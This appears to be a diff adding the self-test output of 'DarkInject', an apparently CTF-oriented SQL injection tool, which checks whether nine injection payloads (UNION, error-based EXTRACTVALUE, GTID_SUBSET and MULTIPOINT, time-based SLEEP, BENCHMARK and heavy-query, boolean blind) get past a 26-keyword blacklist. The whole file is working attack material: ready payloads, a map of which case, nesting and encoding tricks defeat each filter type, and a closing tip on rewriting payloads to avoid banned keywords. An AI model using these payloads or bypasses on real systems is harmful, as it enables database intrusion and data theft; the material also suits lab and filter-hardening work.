@@ -1,0 +1,88 @@
+==============================================================================
+  DarkInject — Blacklist Bypass Self-Test
+==============================================================================
+  Blacklist: lab/blacklist_ctf.txt
+  Banned tokens: 26
+  'union', 'sleep', 'benchmark', 'get_lock', 'release_lock', 'extractvalue', 'updatexml', 'load_file', 'outfile', 'dumpfile', ' into ', 'insert', 'update', 'delete', 'drop', 'alter', 'create', 'replace', 'truncate', 'handler', 'procedure', '--', '/*', '*/', '#', ';'
+  [!] Comment tokens are banned → payloads must be comment-free
+  Candidate strategies: raw, case, lower, nest, nest+blank, alt, nest+alt, charencode
+==============================================================================
+
+▸ union (numeric)
+  payload: -1 UNION SELECT 1,2,3
+    ✗ presence(i)  reject on match  → (no strategy available under this semantics)
+    ✓ presence(cs) reject on match  → raw, case, alt
+    ✓ strip(single,i)  remove once   → nest, nest+blank, nest+alt
+    ✓ strip(single,cs) remove once   → raw, case, nest, nest+blank, alt, nest+alt
+    ✗ strip(recursive,i)  remove until clean  → (no strategy available under this semantics)
+
+▸ union (string)
+  payload: -1' UNION SELECT 1,2,3 AND '1'='1
+    ✗ presence(i)  reject on match  → (no strategy available under this semantics)
+    ✓ presence(cs) reject on match  → raw
+    ✓ strip(single,i)  remove once   → nest, nest+blank
+    ✓ strip(single,cs) remove once   → raw, case, nest, nest+blank
+    ✗ strip(recursive,i)  remove until clean  → (no strategy available under this semantics)
+
+▸ error-based (extractvalue)
+  payload: 1 AND (EXTRACTVALUE(1,CONCAT(0x7e,(SELECT DATABASE()),0x7e)))
+    ✗ presence(i)  reject on match  → (no strategy available under this semantics)
+    ✓ presence(cs) reject on match  → raw, case
+    ✓ strip(single,i)  remove once   → nest, nest+blank
+    ✓ strip(single,cs) remove once   → raw, case, nest, nest+blank
+    ✗ strip(recursive,i)  remove until clean  → (no strategy available under this semantics)
+
+▸ error-based (GTID_SUBSET)
+  payload: 1 AND (GTID_SUBSET(CONCAT(0x7e,(SELECT DATABASE()),0x7e),1))
+    ✓ presence(i)  reject on match  → raw, case, lower, nest, nest+blank
+    ✓ presence(cs) reject on match  → raw, case, lower, nest, nest+blank
+    ✓ strip(single,i)  remove once   → raw, case, lower, nest, nest+blank
+    ✓ strip(single,cs) remove once   → raw, case, lower, nest, nest+blank
+    ✓ strip(recursive,i)  remove until clean  → raw, case, lower, nest, nest+blank
+
+▸ error-based (geometric function)
+  payload: 1 AND (MULTIPOINT((SELECT DATABASE())))
+    ✓ presence(i)  reject on match  → raw, case, lower, nest, nest+blank
+    ✓ presence(cs) reject on match  → raw, case, lower, nest, nest+blank
+    ✓ strip(single,i)  remove once   → raw, case, lower, nest, nest+blank
+    ✓ strip(single,cs) remove once   → raw, case, lower, nest, nest+blank
+    ✓ strip(recursive,i)  remove until clean  → raw, case, lower, nest, nest+blank
+
+▸ time-based (SLEEP)
+  payload: 1 AND IF((ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114),SLEEP(3),0)
+    ✗ presence(i)  reject on match  → (no strategy available under this semantics)
+    ✓ presence(cs) reject on match  → raw, case
+    ✓ strip(single,i)  remove once   → nest, nest+blank
+    ✓ strip(single,cs) remove once   → raw, case, nest, nest+blank
+    ✗ strip(recursive,i)  remove until clean  → (no strategy available under this semantics)
+
+▸ time-based (BENCHMARK)
+  payload: 1 AND IF((ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114),BENCHMARK(10000000,MD5(1)),0)
+    ✗ presence(i)  reject on match  → (no strategy available under this semantics)
+    ✓ presence(cs) reject on match  → raw, case
+    ✓ strip(single,i)  remove once   → nest, nest+blank
+    ✓ strip(single,cs) remove once   → raw, case, nest, nest+blank
+    ✗ strip(recursive,i)  remove until clean  → (no strategy available under this semantics)
+
+▸ time-based (heavy query)
+  payload: 1 AND IF((1>2),(SELECT COUNT(*) FROM information_schema.columns A,information_schema.columns B,information_schema.columns C),0)
+    ✓ presence(i)  reject on match  → raw, case, lower, nest, nest+blank
+    ✓ presence(cs) reject on match  → raw, case, lower, nest, nest+blank
+    ✓ strip(single,i)  remove once   → raw, case, lower, nest, nest+blank
+    ✓ strip(single,cs) remove once   → raw, case, lower, nest, nest+blank
+    ✓ strip(recursive,i)  remove until clean  → raw, case, lower, nest, nest+blank
+
+▸ boolean blind injection
+  payload: 1 AND (ASCII(SUBSTR((SELECT DATABASE()),1,1))>=114)
+    ✓ presence(i)  reject on match  → raw, case, lower, nest, nest+blank
+    ✓ presence(cs) reject on match  → raw, case, lower, nest, nest+blank
+    ✓ strip(single,i)  remove once   → raw, case, lower, nest, nest+blank
+    ✓ strip(single,cs) remove once   → raw, case, lower, nest, nest+blank
+    ✓ strip(recursive,i)  remove until clean  → raw, case, lower, nest, nest+blank
+
+==============================================================================
+  Bypassable combinations: 35/45
+  Tip: under presence(reject on match), if the payload contains any banned word it will always be blocked,
+       the real solution is to "rewrite to avoid the keywords" (boolean blind injection / heavy-query delay / non-banned error functions),
+       not to count on tamper transformations.
+==============================================================================
